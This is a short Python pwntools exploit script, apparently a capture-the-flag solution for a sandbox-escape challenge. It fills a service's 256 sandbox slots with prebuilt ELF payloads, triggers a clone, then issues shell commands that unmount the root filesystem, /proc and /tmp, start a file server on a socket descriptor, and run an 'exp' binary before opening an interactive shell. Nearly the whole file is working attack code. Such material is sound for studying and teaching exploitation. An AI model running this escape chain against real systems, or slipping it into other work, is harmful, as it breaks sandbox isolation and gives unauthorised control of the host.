from pwn import *

context.arch = 'amd64'

os.system('make')
idle_elf = open('./idle', 'rb').read()
init_shell = open('./shell', 'rb').read()

#p = remote('localhost', 1024)
p = listen(1234)
_ = p.wait_for_connection()

def sandbox(elf):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'len?', str(len(elf)).encode())
    p.sendafter(b'data?', elf)

def clone(num, elf):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'number:', str(num).encode())
    if elf != None:
        p.sendlineafter(b'len?', str(len(elf)).encode())
        p.sendafter(b'data?', elf)

for i in range(256):
    if i == 0:
        sandbox(init_shell)
    else:
        sandbox(idle_elf)

clone(0, None)
p.recvuntil(b' ')
pause()
p.sendline(b'/bin/busybox umount /')
p.sendline(b'exec 2>&1')
# TODO: make sure this fd is correct
# this fd should be a socket fd that's not the stdin/stdout one
# For ./run_shared.sh the fd becomes 4
# For ./run.sh inside socat the fd becomes 6
p.sendline(b'/tmp/working/bin/start_fserv 4')
p.sendline(b'umount /proc')
p.sendline(b'/tmp/working/bin/exp 4') # TODO: make sure 4 is the correct PID
p.sendline(b'umount /tmp/*')
p.sendline(b'umount /tmp/working')
p.sendline(b'umount /tmp')
p.interactive()

